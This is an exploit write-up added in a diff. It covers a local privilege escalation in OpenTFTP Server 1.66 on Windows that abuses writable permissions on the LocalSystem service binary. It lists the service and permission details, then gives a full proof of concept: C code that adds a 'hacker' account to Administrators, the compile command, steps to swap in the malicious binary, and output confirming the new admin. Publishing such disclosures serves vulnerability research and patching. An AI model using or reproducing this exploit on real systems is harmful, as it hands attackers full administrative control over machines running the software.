@@ -1,0 +1,103 @@
+# Exploit Title:   OpenTFTP 1.66 - Local Privilege Escalation
+# Exploit Author:  boku
+# Date: 2020-02-12
+# Vendor Homepage: https://sourceforge.net/projects/tftp-server/
+# Software Link:   https://sourceforge.net/projects/tftp-server/files/tftp%20server%20single%20port/OpenTFTPServerSPInstallerV1.66.exe/download
+# Version:         1.66
+# Tested On:       Windows 10 (32-bit)
+
+# About:           
+# "MultiThreaded TFTP Server Open Source Freeware Windows/Unix for PXEBOOT, firmware load, support tsize, blksize, timeout Server Port Ranges, 
+# Block Number Rollover for Large Files. Runs as Service/daemon. Single Port version also available." 
+# Downloads: 43,284 This Week - https://sourceforge.net/projects/tftp-server/
+
+# Vulnerability Details:
+# On Windows, Open TFTP Server v1.66, suffers from insecure file & folder permissions. 
+# This allows a low-privilge, local attacker to escalate their permissions to Administrator; 
+# by replacing the 'TFTPServer' service binary with a maliciously-crafted, binary executable. 
+# The TFTP Server runs as an 'Auto_Start' Service, with 'LocalSystem' priviledges, after the 
+# default installation. After the attacker has planted the malicious binary, the code will 
+# be executed with System priviledges on the next boot of the windows device. See PoC below for details.
+
+## Service Information (there is also an Unquoted Service Path)
+C:\>sc qc TFTPServer
+SERVICE_NAME: TFTPServer
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\OpenTFTPServer\OpenTFTPServerSP.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Open TFTP Single Port Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+## Insecure Folder Permission
+C:\OpenTFTPServer BUILTIN\Administrators:(OI)(CI)(ID)F
+                  NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F
+                  BUILTIN\Users:(OI)(CI)(ID)R
+                  NT AUTHORITY\Authenticated Users:(ID)C
+                  NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
+
+## Insecure File/Service Permission
+C:\OpenTFTPServer\OpenTFTPServerSP.exe BUILTIN\Administrators:(I)(F)
+                                       NT AUTHORITY\SYSTEM:(I)(F)
+                                       BUILTIN\Users:(I)(RX)
+                                       NT AUTHORITY\Authenticated Users:(I)(M)
+
+## Local Privilege Escalation Proof of Concept
+#0.  Download & install Open TFTP Server v1.66
+
+#1.  Create low privileged user & change to the user
+  C:\Users\lowPrivUser>net user lowprivuser | findstr /i "Membership Name" | findstr /v "Full"
+  User name                    lowPrivUser
+  Local Group Memberships      *Users
+  Global Group memberships     *None
+  C:\>whoami
+  mycomputer\lowprivuser 
+
+#2.  Move the Service EXE to a new name
+  C:\OpenTFTPServer>move OpenTFTPServerSP.exe ~OpenTFTPServerSP.exe
+        1 file(s) moved.
+
+#3.  Create malicious binary on kali linux
+  1) Download dependencies
+   root@kali# apt install gcc-mingw-w64-i686 wine64 -y
+  2) Add Admin User C Code
+   root@kali# cat addAdmin.c
+   #include<windows.h>
+   int main(void){
+    system("net user hacker mypassword /add");
+    system("net localgroup Administrators hacker /add");
+    WinExec("C:\\OpenTFTPServer\\~OpenTFTPServerSP.exe",0);
+    return 0;
+   }
+  3) Compile Code
+   root@kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o OpenTFTPServerSP.exe
+
+#4. Transfer created 'OpenTFTPServerSP.exe' to the Windows Host 
+
+#5. Move the created 'OpenTFTPServerSP.exe' binary to the 'C:\OpenTFTPServer\' Folder
+  C:\>move C:\Users\lowPrivUser\Desktop\OpenTFTPServerSP.exe C:\OpenTFTPServer\
+        1 file(s) moved.
+  C:\>dir C:\OpenTFTPServer | findstr "OpenTFTPServerSP.exe"
+  02/12/2020  05:59 PM           288,659 OpenTFTPServerSP.exe
+  02/12/2020  06:38 PM           221,560 ~OpenTFTPServerSP.exe
+
+#6. Reboot the Computer
+
+#7. Look at that new Admin
+  C:\Users\lowPrivUser>net users hacker | findstr "Local name active"
+  User name                    hacker
+  Account active               Yes
+  Local Group Memberships      *Administrators       *Users
+
+  C:\Users\lowPrivUser>net localgroup Administrators
+  Alias name     Administrators
+  Comment        Administrators have complete and unrestricted access to the computer/domain
+
+  Members
+  -------------------------------------------------------------------------------
+  Administrator
+  boku
+  hacker
